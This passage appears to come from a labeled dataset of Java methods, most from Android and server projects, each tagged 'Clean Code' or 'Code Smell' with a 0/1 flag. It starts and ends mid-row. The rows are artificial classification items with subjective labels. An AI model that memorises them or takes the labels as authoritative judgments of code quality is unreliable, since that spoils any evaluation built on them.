 * @param handler The {@link Handler} to run {@code onCompletionAction}.
 * @param onCompletionAction A {@link Runnable} which is executed immediately after the mediasources have been added to the playlist.
 */
public final synchronized void addMediaSources(int index,Collection<MediaSource> mediaSources,Handler handler,Runnable onCompletionAction){
  addPublicMediaSources(index,mediaSources,handler,onCompletionAction);
}",0,Clean Code
"private void processLoadedFilterPeersInternal(TLRPC.messages_Dialogs pinnedDialogs,TLRPC.messages_Dialogs pinnedRemoteDialogs,ArrayList<TLRPC.User> users,ArrayList<TLRPC.Chat> chats,ArrayList<MessagesController.DialogFilter> filtersToSave,SparseArray<MessagesController.DialogFilter> filtersToDelete,ArrayList<Integer> filtersOrder,HashMap<Integer,HashSet<Long>> filterDialogRemovals,HashSet<Integer> filtersUnreadCounterReset,Runnable onDone){
  boolean anythingChanged=false;
  putUsersAndChats(users,chats,true,false);
  for (int a=0, N=filtersToDelete.size(); a < N; a++) {
    deleteDialogFilterInternal(filtersToDelete.valueAt(a));
    anythingChanged=true;
  }
  for (  Integer id : filtersUnreadCounterReset) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(id);
    if (filter == null) {
      continue;
    }
    filter.pendingUnreadCount=-1;
  }
  for (  HashMap.Entry<Integer,HashSet<Long>> entry : filterDialogRemovals.entrySet()) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(entry.getKey());
    if (filter == null) {
      continue;
    }
    HashSet<Long> set=entry.getValue();
    for (    Long id : set) {
      filter.pinnedDialogs.delete(id);
    }
    anythingChanged=true;
  }
  for (int a=0, N=filtersToSave.size(); a < N; a++) {
    saveDialogFilterInternal(filtersToSave.get(a),false,true);
    anythingChanged=true;
  }
  boolean orderChanged=false;
  for (int a=0, N=dialogFilters.size(); a < N; a++) {
    MessagesController.DialogFilter filter=dialogFilters.get(a);
    int order=filtersOrder.indexOf(filter.id);
    if (filter.order != order) {
      filter.order=order;
      anythingChanged=true;
      orderChanged=true;
    }
  }
  if (orderChanged) {
    Collections.sort(dialogFilters,(o1,o2) -> {
      if (o1.order > o2.order) {
        return 1;
      }
 else       if (o1.order < o2.order) {
        return -1;
      }
      return 0;
    }
);
    saveDialogFiltersOrderInternal();
  }
  int remote=anythingChanged ? 1 : 2;
  calcUnreadCounters(true);
  getMessagesController().processLoadedDialogFilters(new ArrayList<>(dialogFilters),pinnedDialogs,pinnedRemoteDialogs,users,chats,null,remote,onDone);
}",1,Code Smell
"@Override public WorkflowProcess clone() throws CloneNotSupportedException {
  WorkflowProcess cloneProcess=(WorkflowProcess)super.clone();
  cloneProcess.setStartEvent((StartEvent)this.startEvent.clone());
  cloneProcess.setEndEvent((EndEvent)this.endEvent.clone());
  Map<String,WorkflowTask> nameToTaskMap=new HashMap<>();
  StartEvent startEvent=cloneProcess.getStartEvent();
  Map<WorkflowAction,List<ConditionNextElement>> workflowActionListMap=startEvent.getActionToNextElementMap();
  Queue<Map<WorkflowAction,List<ConditionNextElement>>> queue=new LinkedBlockingQueue<>();
  if (MapUtils.isNotEmpty(workflowActionListMap)) {
    queue.add(workflowActionListMap);
  }
  while (!queue.isEmpty()) {
    workflowActionListMap=queue.remove();
    for (    List<ConditionNextElement> conditionNextElements : workflowActionListMap.values()) {
      for (      ConditionNextElement conditionNextElement : conditionNextElements) {
        Element element=conditionNextElement.getElement();
        if (element instanceof WorkflowTask) {
          WorkflowTask workflowTask=(WorkflowTask)element;
          nameToTaskMap.put(workflowTask.getName(),workflowTask);
        }
        if (element instanceof NextableElement) {
          NextableElement nextableElement=(NextableElement)element;
          Map<WorkflowAction,List<ConditionNextElement>> childListMap=nextableElement.getActionToNextElementMap();
          if (MapUtils.isNotEmpty(childListMap)) {
            queue.add(childListMap);
          }
        }
      }
    }
  }
  cloneProcess.setNameToTaskMap(nameToTaskMap);
  Map<ProcessEvent,List<ProcessEventListener>> cloneListeners=Maps.newHashMap();
  cloneListeners.putAll(listeners);
  cloneProcess.listeners=cloneListeners;
  return cloneProcess;
}
",1,Code Smell
"private void insertTeslaUser(TeslaServiceUserDO teslaServiceUserDO){
  UserDO userDo=new UserDO();
  userDo.setEmpId(teslaServiceUserDO.getEmployeeId());
  String bucUserId=teslaServiceUserDO.getBucUserId();
  if (!StringUtils.isBlank(bucUserId)) {
    if (bucUserId.endsWith("".0"")) {
      bucUserId=bucUserId.substring(0,bucUserId.indexOf("".""));
    }
    userDo.setBucId(Long.parseLong(bucUserId));
  }
  userDo.setTenantId(Constants.DEFAULT_TENANT_ID);
  userDo.setLoginName(teslaServiceUserDO.getUsername());
  userDo.setNickName(teslaServiceUserDO.getNickname());
  userDo.setEmail(teslaServiceUserDO.getEmail());
  userDo.setPhone(teslaServiceUserDO.getMobilephone());
  userDo.setAliww(teslaServiceUserDO.getAliww());
  userDo.setGmtCreate(new Date());
  userDo.setIsLocked((byte)(userDo.getIsLocked() == 0 ? 1 : 0));
  userDo.setSecretKey(teslaServiceUserDO.getSecretkey());
  userDo.setUserId(UserUtil.getUserId(userDo));
  log.info(""insert user:{}"",userDo);
  userMapper.insert(userDo);
}",0,Clean Code
"private static FakeExtractorOutput consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  FakeExtractorOutput output=new FakeExtractorOutput();
  extractor.init(output);
  consumeTestData(extractor,input,timeUs,output,retryFromStartIfLive);
  return output;
}
private static void consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,FakeExtractorOutput output,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  extractor.seek(input.getPosition(),timeUs);
  PositionHolder seekPositionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (readResult != Extractor.RESULT_END_OF_INPUT) {
    try {
      seekPositionHolder.position=Long.MIN_VALUE;
      readResult=extractor.read(input,seekPositionHolder);
      if (readResult == Extractor.RESULT_SEEK) {
        long seekPosition=seekPositionHolder.position;
        Assertions.checkState(0 <= seekPosition && seekPosition <= Integer.MAX_VALUE);
        input.setPosition((int)seekPosition);
      }
    }
 catch (    SimulatedIOException e) {
      if (!retryFromStartIfLive) {
        continue;
      }
      boolean isOnDemand=input.getLength() != C.LENGTH_UNSET || (output.seekMap != null && output.seekMap.getDurationUs() != C.TIME_UNSET);
      if (isOnDemand) {
        continue;
      }
      input.setPosition(0);
      for (int i=0; i < output.numberOfTracks; i++) {
        output.trackOutputs.valueAt(i).clear();
      }
      extractor.seek(0,0);
    }
  }
}",0,Clean Code
"private List<Cue> getDisplayCues(){
  @Cue.AnchorType int positionAnchor=Cue.ANCHOR_TYPE_END;
  int cueBuilderCount=cueBuilders.size();
  List<Cue> cueBuilderCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilders.get(i).build(Cue.TYPE_UNSET);
    cueBuilderCues.add(cue);
    if (cue != null) {
      positionAnchor=Math.min(positionAnchor,cue.positionAnchor);
    }
  }
  List<Cue> displayCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilderCues.get(i);
    if (cue != null) {
      if (cue.positionAnchor != positionAnchor) {
        cue=cueBuilders.get(i).build(positionAnchor);
      }
      displayCues.add(cue);
    }
  }
  return displayCues;
}",0,Clean Code
"@Override protected JPanel createDetailsView(JFileChooser fc){
  JPanel p=super.createDetailsView(fc);
  if (!SystemInfo.isWindows)   return p;
  JScrollPane scrollPane=null;
  for (  Component c : p.getComponents()) {
    if (c instanceof JScrollPane) {
      scrollPane=(JScrollPane)c;
      break;
    }
  }
  if (scrollPane == null)   return p;
  Component view=scrollPane.getViewport().getView();
  if (!(view instanceof JTable))   return p;
  JTable table=(JTable)view;
  TableCellRenderer defaultRenderer=table.getDefaultRenderer(Object.class);
  table.setDefaultRenderer(Object.class,new TableCellRenderer(){
    @Override public Component getTableCellRendererComponent(    JTable table,    Object value,    boolean isSelected,    boolean hasFocus,    int row,    int column){
      if (value instanceof String && ((String)value).startsWith(""\u200e"")) {
        String str=(String)value;
        char[] buf=new char[str.length()];
        int j=0;
        for (int i=0; i < buf.length; i++) {
          char ch=str.charAt(i);
          if (ch != '\u200e' && ch != '\u200f')           buf[j++]=ch;
        }
        value=new String(buf,0,j);
      }
      return defaultRenderer.getTableCellRendererComponent(table,value,isSelected,hasFocus,row,column);
    }
  }
);
  return p;
}",1,Code Smell
"public boolean openPhotosEditor(ArrayList<SendMessagesHelper.SendingMediaInfo> photoPathes,CharSequence caption){
  final ArrayList<MediaController.PhotoEntry> entries=new ArrayList<>();
  for (int a=0; a < photoPathes.size(); ++a) {
    SendMessagesHelper.SendingMediaInfo photoInfo=photoPathes.get(a);
    String path=null;
    if (photoInfo.path != null) {
      path=photoInfo.path;
    }
 else     if (photoInfo.uri != null) {
      if (path == null) {
        try {
          final File file=AndroidUtilities.generatePicturePath(isSecretChat(),"""");
          InputStream in=ApplicationLoader.applicationContext.getContentResolver().openInputStream(photoInfo.uri);
          FileOutputStream fos=new FileOutputStream(file);
          byte[] buffer=new byte[8 * 1024];
          int lengthRead;
          while ((lengthRead=in.read(buffer)) > 0) {
            fos.write(buffer,0,lengthRead);
            fos.flush();
          }
          in.close();
          fos.close();
          path=file.getAbsolutePath();
        }
 catch (        Exception e) {
          FileLog.e(e);
          continue;
        }
      }
    }
    if (path == null) {
      continue;
    }
    int orientation=0;
    try {
      ExifInterface ei=new ExifInterface(path);
      int exif=ei.getAttributeInt(ExifInterface.TAG_ORIENTATION,ExifInterface.ORIENTATION_NORMAL);
switch (exif) {
case ExifInterface.ORIENTATION_ROTATE_90:
        orientation=90;
      break;
case ExifInterface.ORIENTATION_ROTATE_180:
    orientation=180;
  break;
case ExifInterface.ORIENTATION_ROTATE_270:
orientation=270;
break;
}
}
 catch (Exception e) {
FileLog.e(e);
}
MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,path,orientation,photoInfo.isVideo,0,0,0);
if (a == photoPathes.size() - 1 && caption != null) {
entry.caption=caption;
}
entries.add(entry);
}
if (entries.isEmpty()) {
return false;
}
if (getParentActivity() != null) {
final boolean[] checked=new boolean[entries.size()];
Arrays.fill(checked,true);
PhotoViewer.getInstance().setParentActivity(this,themeDelegate);
PhotoViewer.getInstance().openPhotoForSelect(new ArrayList<>(entries),entries.size() - 1,0,false,new PhotoViewer.EmptyPhotoViewerProvider(){
@Override public ImageReceiver.BitmapHolder getThumbForPhoto(MessageObject messageObject,TLRPC.FileLocation fileLocation,int index){
return null;
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
for (int i=entries.size() - 1; i >= 0; --i) {
if (!checked[i]) {
entries.remove(i);
}
}
sendPhotosGroup(entries,notify,scheduleDate,forceDocument);
}
@Override public int setPhotoChecked(int index,VideoEditedInfo videoEditedInfo){
return index;
}
@Override public boolean isPhotoChecked(int index){
return checked[index];
}
@Override public boolean canScrollAway(){
return false;
}
}
,this);
}
 else {
fillEditingMediaWithCaption(caption,null);
sendPhotosGroup(entries,false,0,false);
afterMessageSend();
}
return true;
}",1,Code Smell
"@Deprecated @Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String userId=InputParser.getQueryParamOrThrowError(req,""userId"",true);
  String thirdPartyId=InputParser.getQueryParamOrThrowError(req,""thirdPartyId"",true);
  String thirdPartyUserId=InputParser.getQueryParamOrThrowError(req,""thirdPartyUserId"",true);
  if (userId != null && (thirdPartyId != null || thirdPartyUserId != null)) {
    throw new ServletException(new BadRequestException(""Please provide only one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  if (userId == null && (thirdPartyId == null || thirdPartyUserId == null)) {
    throw new ServletException(new BadRequestException(""Please provide one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  try {
    AuthRecipeUserInfo user=null;
    if (userId != null) {
      AppIdentifier appIdentifier=getAppIdentifier(req);
      try {
        StorageAndUserIdMapping storageAndUserIdMapping=this.enforcePublicTenantAndGetStorageAndUserIdMappingForAppSpecificApi(req,userId,UserIdType.ANY,true);
        if (storageAndUserIdMapping.userIdMapping != null) {
          userId=storageAndUserIdMapping.userIdMapping.superTokensUserId;
        }
        user=ThirdParty.getUser(appIdentifier,storageAndUserIdMapping.storage,userId);
        if (user != null) {
          UserIdMapping.populateExternalUserIdForUsers(appIdentifier,storageAndUserIdMapping.storage,new AuthRecipeUserInfo[]{user});
        }
      }
 catch (      UnknownUserIdException e) {
      }
    }
 else {
      TenantIdentifier tenantIdentifier=getTenantIdentifier(req);
      Storage storage=getTenantStorage(req);
      user=ThirdParty.getUser(tenantIdentifier,storage,thirdPartyId,thirdPartyUserId);
      if (user != null) {
        UserIdMapping.populateExternalUserIdForUsers(tenantIdentifier.toAppIdentifier(),storage,new AuthRecipeUserInfo[]{user});
      }
    }
    if (user == null) {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",userId != null ? ""UNKNOWN_USER_ID_ERROR"" : ""UNKNOWN_THIRD_PARTY_USER_ERROR"");
      super.sendJsonResponse(200,result,resp);
    }
 else {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",""OK"");
      JsonObject userJson=getVersionFromRequest(req).greaterThanOrEqualTo(SemVer.v4_0) ? user.toJson() : user.toJsonWithoutAccountLinking();
      if (getVersionFromRequest(req).lesserThan(SemVer.v3_0)) {
        userJson.remove(""tenantIds"");
      }
      result.add(""user"",userJson);
      super.sendJsonResponse(200,result,resp);
    }
  }
 catch (  StorageQueryException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
}",1,Code Smell
"public List<List<String>> methodClusters(){
  if (keyBehaviorEntries.size() < 6) {
    return null;
  }
  List<String> methodNames=new ArrayList<>(keyBehaviorEntries.size());
  for (  KeyBehaviorEntry entry : keyBehaviorEntries) {
    methodNames.add(entry.getMethodName());
  }
  List<double[]> vectors=new ArrayList<>();
  Map<String,double[]> vectorMap=new HashMap<>();
  int maxLength=-1;
  for (  String methodName : methodNames) {
    if (methodName.length() > maxLength) {
      maxLength=methodName.length();
    }
  }
  for (  String methodName : methodNames) {
    double[] vector=new double[maxLength];
    for (int i=0; i < methodName.length(); i++) {
      vector[i]=methodName.charAt(i);
    }
    for (int i=methodName.length(); i < maxLength; i++) {
      vector[i]=0;
    }
    vectors.add(vector);
    vectorMap.put(methodName,vector);
  }
  KMeans kMeans=new KMeans();
  return kMeans.cluster(vectors,methodNames,vectorMap);
}",1,Code Smell
"private void refreshPcapDumpInfo(Context context){
  String info="""";
  Prefs.DumpMode mode=CaptureService.getDumpMode();
switch (mode) {
case NONE:
    info=getString(R.string.no_dump_info);
  break;
case HTTP_SERVER:
info=String.format(getResources().getString(R.string.http_server_status),Utils.getLocalIPAddress(mActivity),CaptureService.getHTTPServerPort());
break;
case PCAP_FILE:
info=getString(R.string.pcap_file_info);
String pcapFname=CaptureService.getPcapFname();
if (pcapFname != null) info=pcapFname;
break;
case UDP_EXPORTER:
info=String.format(getResources().getString(R.string.collector_info),CaptureService.getCollectorAddress(),CaptureService.getCollectorPort());
break;
}
mCollectorInfoText.setText(info);
Drawable drawable=null;
if ((mAppFilter != null) && (!mAppFilter.isEmpty())) {
Pair<String,Drawable> pair=getAppFilterTextAndIcon(context);
drawable=pair.second;
}
if (drawable != null) {
mCollectorInfoIcon.setImageDrawable(drawable);
mCollectorInfoIcon.setVisibility(View.VISIBLE);
}
 else mCollectorInfoIcon.setVisibility(View.GONE);
}
",0,Clean Code
"private boolean typeEquals(String[] types1s,String[] types2s){
  if (Arrays.equals(types1s,types2s)) {
    return true;
  }
  if (types1s == null || types2s == null) {
    return false;
  }
  if (types1s.length != types2s.length) {
    return false;
  }
  for (int i=0; i < types1s.length; i++) {
    String type1=types1s[i];
    String type2=types2s[i];
    if (StringUtils.equalsIgnoreCase(type1,type2)) {
      continue;
    }
    if (type1 != null && type2 != null) {
      if (type1.contains(""java.util"") && type2.contains(""java.util"")) {
        try {
          Class type1Class=Class.forName(type1);
          Class type2Class=Class.forName(type2);
          boolean ret=(type1Class == type2Class) || type1Class.isAssignableFrom(type2Class) || type2Class.isAssignableFrom(type1Class);
          if (!ret) {
            return false;
          }
          continue;
        }
 catch (        Exception e) {
        }
      }
    }
    return false;
  }
  return true;
}",1,Code Smell
"private void handleClientMessage(ChannelInfo channelInfo,JSONObject message,String messageRaw){
  try {
    String requestName=null;
    if (message.has(""name"") && !message.isNull(""name"")) {
      requestName=(String)message.get(""name"");
    }
    if (requestName == null) {
      LOGGER.error(""No request name could be found in client message: {}"",messageRaw);
      return;
    }
    handleWithClientRequestHandler(channelInfo,message,messageRaw,requestName);
  }
 catch (  Exception exception) {
    LOGGER.error(""Error occurred while handling client message: {}"",messageRaw,exception);
    handleError(channelInfo,message,exception);
  }
}
",0,Clean Code
"@Override public void addItem(Object item,int index,int length,int rowIndex,int edge){
  View v=(View)item;
  int start, end;
  if (edge == Integer.MIN_VALUE || edge == Integer.MAX_VALUE) {
    edge=!mGrid.isReversedFlow() ? mWindowAlignment.mainAxis().getPaddingMin() : mWindowAlignment.mainAxis().getSize() - mWindowAlignment.mainAxis().getPaddingMax();
  }
  boolean edgeIsMin=!mGrid.isReversedFlow();
  if (edgeIsMin) {
    start=edge;
    end=edge + length;
  }
 else {
    start=edge - length;
    end=edge;
  }
  int startSecondary=getRowStartSecondary(rowIndex) + mWindowAlignment.secondAxis().getPaddingMin() - mScrollOffsetSecondary;
  mChildrenStates.loadView(v,index);
  layoutChild(rowIndex,v,start,end,startSecondary);
  if (DEBUG) {
    Log.d(getTag(),""addView "" + index + "" ""+ v);
  }
  if (TRACE)   TraceCompat.endSection();
  if (!mState.isPreLayout()) {
    updateScrollLimits();
  }
  if ((mFlag & PF_STAGE_MASK) != PF_STAGE_LAYOUT && mPendingMoveSmoothScroller != null) {
    mPendingMoveSmoothScroller.consumePendingMovesAfterLayout();
  }
  if (mChildLaidOutListener != null) {
    RecyclerView.ViewHolder vh=mBaseGridView.getChildViewHolder(v);
    mChildLaidOutListener.onChildLaidOut(mBaseGridView,v,index,vh == null ? NO_ID : vh.getItemId());
  }
}
",0,Clean Code
"/** 
 * Adds messages list in chronological order. Use this method to add history.
 * @param messages messages from history.
 * @param reverse  {@code true} if need to reverse messages before adding.
 */
public void addToEnd(List<MESSAGE> messages,boolean reverse){
  if (messages == null || messages.isEmpty())   return;
  if (reverse)   Collections.reverse(messages);
  removeLoadingMessageIfNeeded();
  if (!items.isEmpty()) {
    int lastItemPosition=items.size() - 1;
    if (items.get(lastItemPosition).item instanceof Date) {
      Date lastItem=(Date)items.get(lastItemPosition).item;
      if (DateFormatter.isSameDay(messages.get(0).getCreatedAt(),lastItem)) {
        items.remove(lastItemPosition);
        notifyItemRemoved(lastItemPosition);
      }
    }
  }
  int oldSize=items.size();
  generateDateHeaders(messages);
  notifyItemRangeInserted(oldSize,items.size() - oldSize);
}",1,Code Smell
"@Test public void testUpdateChannel_success(){
  PayChannelDO dbChannel=randomPojo(PayChannelDO.class,o -> {
    o.setCode(PayChannelEnum.ALIPAY_APP.getCode());
    o.setConfig(randomAlipayPayClientConfig());
  }
);
  channelMapper.insert(dbChannel);
  AlipayPayClientConfig config=randomAlipayPayClientConfig();
  PayChannelUpdateReqVO reqVO=randomPojo(PayChannelUpdateReqVO.class,o -> {
    o.setId(dbChannel.getId());
    o.setStatus(randomCommonStatus());
    o.setConfig(JsonUtils.toJsonString(config));
  }
);
  channelService.updateChannel(reqVO);
  PayChannelDO channel=channelMapper.selectById(reqVO.getId());
  assertPojoEquals(reqVO,channel,""config"");
  assertPojoEquals(config,channel.getConfig());
  assertNull(channelService.getClientCache().getIfPresent(channel.getId()));
}
",0,Clean Code
"@Override public ONNXNode writeONNXGraph(ONNXRef<?> input){
  ONNXContext onnx=input.onnxContext();
  svm_model model=models.get(0);
  int numOneVOne=model.label.length * (model.label.length - 1) / 2;
  int numFeatures=featureIDMap.size();
  Map<String,Object> attributes=new HashMap<>();
  attributes.put(""classlabels_ints"",model.label);
  float[] coefficients=new float[model.l * (model.nr_class - 1)];
  for (int i=0; i < model.nr_class - 1; i++) {
    for (int j=0; j < model.l; j++) {
      coefficients[i * model.l + j]=(float)model.sv_coef[i][j];
    }
  }
  attributes.put(""coefficients"",coefficients);
  attributes.put(""kernel_params"",new float[]{(float)model.param.gamma,(float)model.param.coef0,model.param.degree});
  attributes.put(""kernel_type"",KernelType.getKernelType(model.param.kernel_type).name());
  float[] rho=new float[model.rho.length];
  for (int i=0; i < rho.length; i++) {
    rho[i]=(float)-model.rho[i];
  }
  attributes.put(""rho"",rho);
  float[] supportVectors=new float[model.l * numFeatures];
  for (int j=0; j < model.l; j++) {
    svm_node[] sv=model.SV[j];
    for (    svm_node svm_node : sv) {
      int idx=(j * numFeatures) + svm_node.index;
      supportVectors[idx]=(float)svm_node.value;
    }
  }
  attributes.put(""support_vectors"",supportVectors);
  attributes.put(""vectors_per_class"",Arrays.copyOf(model.nSV,model.label.length));
  if (generatesProbabilities) {
    attributes.put(""prob_a"",Arrays.copyOf(Util.toFloatArray(model.probA),numOneVOne));
    attributes.put(""prob_b"",Arrays.copyOf(Util.toFloatArray(model.probB),numOneVOne));
  }
  List<ONNXNode> outputs=input.apply(ONNXOperators.SVM_CLASSIFIER,Arrays.asList(""pred_label"",""svm_output""),attributes);
  ONNXNode predLabel=outputs.get(0);
  ONNXNode svmOutput=outputs.get(1);
  ONNXNode ungatheredOutput=svmOutput;
  if (!generatesProbabilities) {
    if (model.nr_class == 2) {
      ONNXInitializer negOne=onnx.constant(""minus_one"",-1.0f);
      ungatheredOutput=writeDecisionFunction(svmOutput.apply(ONNXOperators.MUL,negOne));
    }
 else {
      ungatheredOutput=writeDecisionFunction(svmOutput);
    }
  }
  int[] backwardsLibSVMMapping=new int[model.label.length];
  for (int i=0; i < model.label.length; i++) {
    backwardsLibSVMMapping[model.label[i]]=i;
  }
  ONNXInitializer indices=onnx.array(""label_indices"",backwardsLibSVMMapping);
  return ungatheredOutput.apply(ONNXOperators.GATHER,indices,Collections.singletonMap(""axis"",1));
}",1,Code Smell
"@Override public boolean initOnce(){
  try {
    Method handleNightMask=DexKit.doFindMethod(DexKit.N_BASE_CHAT_PIE__handleNightMask);
    XposedBridge.hookMethod(handleNightMask,new XC_MethodHook(49){
      Field fMask=null;
      @Override protected void afterHookedMethod(      MethodHookParam param) throws Throwable {
        if (LicenseStatus.sDisableCommonHooks) {
          return;
        }
        if (!isEnabled()) {
          return;
        }
        if (fMask == null) {
          DexFieldDescriptor desc=FindNightMask.getNightMaskField();
          if (desc == null) {
            loge(""FindNightMask/E getNightMaskField return null"");
            return;
          }
          fMask=desc.getFieldInstance(Initiator.getHostClassLoader());
          if (fMask != null) {
            fMask.setAccessible(true);
          }
        }
        if (fMask != null) {
          Object chatPie=param.thisObject;
          View mask=(View)fMask.get(chatPie);
          if (mask != null) {
            mask.setVisibility(View.GONE);
          }
        }
      }
    }
);
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",0,Clean Code
"/** 
 * Unzips a zip file from an input stream to  {@code destDir}.
 * @throws UncheckedIOException if an IO exception occurs
 */
public static void unzip(InputStream input,Path destDir){
  int totalSizeArchive=0;
  int totalEntryArchive=0;
  try (var zip=new ZipInputStream(input)){
    ZipEntry entry;
    while ((entry=zip.getNextEntry()) != null) {
      Path targetDirResolved=destDir.resolve(entry.getName());
      Path destination=targetDirResolved.normalize();
      if (!destination.startsWith(destDir)) {
        throw new IOException(""Bad zip entry: "" + entry.getName());
      }
      if (entry.isDirectory()) {
        FileUtils.createDirectory(destDir);
      }
 else {
        createParentDirectories(destination);
        int nBytes;
        byte[] buffer=new byte[2048];
        int totalSizeEntry=0;
        try (var out=Files.newOutputStream(destination,StandardOpenOption.CREATE_NEW,WRITE)){
          totalEntryArchive++;
          while ((nBytes=zip.read(buffer)) > 0) {
            out.write(buffer,0,nBytes);
            totalSizeEntry+=nBytes;
            totalSizeArchive+=nBytes;
            double compressionRatio=totalSizeEntry * 1d / entry.getCompressedSize();
            if (compressionRatio > ZIP_THRESHOLD_RATIO) {
              throw new IOException(""Ratio between compressed and uncompressed data is highly suspicious "" + FORMAT.numeric(compressionRatio) + ""x, looks like a Zip Bomb Attack"");
            }
          }
          if (totalSizeArchive > ZIP_THRESHOLD_SIZE) {
            throw new IOException(""The uncompressed data size "" + FORMAT.storage(totalSizeArchive) + ""B is too much for the application resource capacity"");
          }
          if (totalEntryArchive > ZIP_THRESHOLD_ENTRIES) {
            throw new IOException(""Too many entries in this archive "" + FORMAT.integer(totalEntryArchive) + "", can lead to inodes exhaustion of the system"");
          }
        }
       }
    }
  }
 catch (  IOException e) {
    throw new UncheckedIOException(e);
  }
}",1,Code Smell
"@Override protected boolean appendVisibleItemsWithoutCache(int toLimit,boolean oneColumnMode){
  final int count=mProvider.getCount();
  int itemIndex;
  int rowIndex;
  int edgeLimit;
  boolean edgeLimitIsValid;
  if (mLastVisibleIndex >= 0) {
    if (mLastVisibleIndex < getLastIndex()) {
      return false;
    }
    itemIndex=mLastVisibleIndex + 1;
    rowIndex=getLocation(mLastVisibleIndex).row;
    int edgeLimitSearchIndex=findRowEdgeLimitSearchIndex(true);
    if (edgeLimitSearchIndex < 0) {
      edgeLimit=Integer.MIN_VALUE;
      for (int i=0; i < mNumRows; i++) {
        edgeLimit=mReversedFlow ? getRowMin(i) : getRowMax(i);
        if (edgeLimit != Integer.MIN_VALUE) {
          break;
        }
      }
    }
 else {
      edgeLimit=mReversedFlow ? findRowMin(false,edgeLimitSearchIndex,null) : findRowMax(true,edgeLimitSearchIndex,null);
    }
    if (mReversedFlow ? getRowMin(rowIndex) <= edgeLimit : getRowMax(rowIndex) >= edgeLimit) {
      rowIndex=rowIndex + 1;
      if (rowIndex == mNumRows) {
        rowIndex=0;
        edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
      }
    }
    edgeLimitIsValid=true;
  }
 else {
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    rowIndex=(mLocations.size() > 0 ? getLocation(getLastIndex()).row + 1 : itemIndex) % mNumRows;
    edgeLimit=0;
    edgeLimitIsValid=false;
  }
  boolean filledOne=false;
  while (true) {
    for (; rowIndex < mNumRows; rowIndex++) {
      if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
        return filledOne;
      }
      int location=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      if (location == Integer.MAX_VALUE || location == Integer.MIN_VALUE) {
        if (rowIndex == 0) {
          location=mReversedFlow ? getRowMin(mNumRows - 1) : getRowMax(mNumRows - 1);
          if (location != Integer.MAX_VALUE && location != Integer.MIN_VALUE) {
            location=location + (mReversedFlow ? -mSpacing : mSpacing);
          }
        }
 else {
          location=mReversedFlow ? getRowMax(rowIndex - 1) : getRowMin(rowIndex - 1);
        }
      }
 else {
        location=location + (mReversedFlow ? -mSpacing : mSpacing);
      }
      int size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
      filledOne=true;
      if (edgeLimitIsValid) {
        while (mReversedFlow ? location - size > edgeLimit : location + size < edgeLimit) {
          if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
            return filledOne;
          }
          location=location + (mReversedFlow ? -size - mSpacing : size + mSpacing);
          size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
        }
      }
 else {
        edgeLimitIsValid=true;
        edgeLimit=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      }
    }
    if (oneColumnMode) {
      return filledOne;
    }
    edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
    rowIndex=0;
  }
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public NDList batchify(NDList[] inputs){
  int batchSize=inputs.length;
  int numInputKinds=inputs[0].size();
  if (numInputKinds == 0) {
    return new NDList();
  }
  try {
    NDList result=new NDList(numInputKinds);
    for (int i=0; i < numInputKinds; i++) {
      NDList inputsOfKind=new NDList(batchSize);
      String inputName=inputs[0].get(i).getName();
      for (      NDList input : inputs) {
        inputsOfKind.add(input.get(i));
      }
      NDArray stacked=NDArrays.stack(new NDList(inputsOfKind));
      stacked.setName(inputName);
      result.add(stacked);
    }
    return result;
  }
 catch (  IndexOutOfBoundsException|EngineException e) {
    for (    NDList input : inputs) {
      if (input.size() != numInputKinds) {
        throw new IllegalArgumentException(""You cannot batch data with different numbers of inputs"",e);
      }
    }
    for (int i=0; i < numInputKinds; i++) {
      Shape kindDataShape=inputs[0].get(i).getShape();
      DataType kindDataType=inputs[0].get(i).getDataType();
      for (      NDList input : inputs) {
        NDArray currInput=input.get(i);
        if (!currInput.getShape().equals(kindDataShape)) {
          throw new IllegalArgumentException(""You cannot batch data with different input shapes"" + currInput.getShape() + "" vs ""+ kindDataShape,e);
        }
        if (!currInput.getDataType().equals(kindDataType)) {
          throw new IllegalArgumentException(""You cannot batch data with different input data types"",e);
        }
      }
    }
    throw e;
  }
}",1,Code Smell
"private void loadTones(){
  getMediaDataController().ringtoneDataStore.loadUserRingtones(false);
  serverTones.clear();
  systemTones.clear();
  for (int i=0; i < getMediaDataController().ringtoneDataStore.userRingtones.size(); i++) {
    RingtoneDataStore.CachedTone cachedTone=getMediaDataController().ringtoneDataStore.userRingtones.get(i);
    Tone tone=new Tone();
    tone.stableId=stableIds++;
    tone.fromServer=true;
    tone.localId=cachedTone.localId;
    tone.title=cachedTone.document.file_name_fixed;
    tone.document=cachedTone.document;
    trimTitle(tone);
    tone.uri=cachedTone.localUri;
    if (startSelectedTone != null && startSelectedTone.document != null && cachedTone.document != null && startSelectedTone.document.id == cachedTone.document.id) {
      startSelectedTone=null;
